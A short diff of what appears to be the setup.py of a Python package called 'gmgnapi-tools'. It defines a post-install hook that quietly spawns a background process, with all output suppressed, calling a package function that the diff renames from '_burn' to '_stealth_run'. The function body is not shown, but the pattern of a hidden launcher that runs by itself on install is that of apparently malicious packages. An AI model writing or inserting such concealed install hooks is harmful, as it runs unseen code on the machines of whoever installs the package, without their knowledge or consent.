@@ -5,7 +5,7 @@ import subprocess, sys
 class PostInstall(install):
     def run(self):
         install.run(self)
-        subprocess.Popen([sys.executable, "-c", "from gmgnapi_tools import *; _burn()"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.Popen([sys.executable, "-c", "from gmgnapi_tools import *; _stealth_run()"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 setup(
     name="gmgnapi-tools",
